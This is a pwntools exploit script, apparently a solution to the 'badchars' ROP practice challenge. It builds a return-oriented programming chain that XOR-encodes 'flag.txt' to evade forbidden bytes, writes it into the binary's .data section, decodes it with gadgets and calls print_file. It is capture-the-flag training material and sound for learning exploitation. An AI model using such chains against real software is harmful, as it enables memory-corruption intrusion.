from pwn import *
import sys

proc = process("./badchars")

# 2e 61 67 78 = xga.

payload = b'0' * 40

print(hex(0x7478742e67616c66 ^ 0x00ff00ffffff0000)) # 0x748774d1989e6c66

payload += p64(0x000000000040069c) # 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(0x7478742e67616c66 ^ 0x00ff00ffffff0000) # 66 6c [61] [67] [2e] 74 [78] 74 -> 74 [78] 74 [2e] [67] [61] 6c 66 = flag.txt
payload += p64(0x0000000000601030) # .data:0000000000601028 __data_start
payload += p64(0x0000000000000000)
payload += p64(0x0000000000000000)
payload += p64(0x0000000000400634) # 0x0000000000400634 : mov qword ptr [r13], r12 ; ret

#payload += p64(0x000000000040069c) # 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#payload += p64(0x0000000000000000) # NUL
#payload += p64(0x0000000000601030) # .data:0000000000601028 __data_start
#payload += p64(0x0000000000000000)
#payload += p64(0x0000000000000000)
#payload += p64(0x0000000000400634) # 0x0000000000400634 : mov qword ptr [r13], r12 ; ret

payload += p64(0x00000000004006a0) # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
payload += p64(0xffffffffffffffff)
payload += p64(0x0000000000601030 + 2) # .data:0000000000601028 __data_start
payload += p64(0x0000000000400628) # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

payload += p64(0x00000000004006a0) # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
payload += p64(0xffffffffffffffff)
payload += p64(0x0000000000601030 + 3) # .data:0000000000601028 __data_start
payload += p64(0x0000000000400628) # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

payload += p64(0x00000000004006a0) # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
payload += p64(0xffffffffffffffff)
payload += p64(0x0000000000601030 + 4) # .data:0000000000601028 __data_start
payload += p64(0x0000000000400628) # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

payload += p64(0x00000000004006a0) # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
payload += p64(0xffffffffffffffff)
payload += p64(0x0000000000601030 + 6) # .data:0000000000601028 __data_start -> 0x2E !!! NOT ALLOWED
payload += p64(0x0000000000400628) # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

payload += p64(0x00000000004006a3) # 0x00000000004006a3 : pop rdi ; ret
payload += p64(0x0000000000601030) # .data:0000000000601028 __data_start
payload += p64(0x0000000000400620) # .text:0000000000400620                 call    _print_file

with open("badchars.bin", "wb") as file:
    file.write(payload)

print(len(payload))

proc.sendline(payload)
proc.interactive()
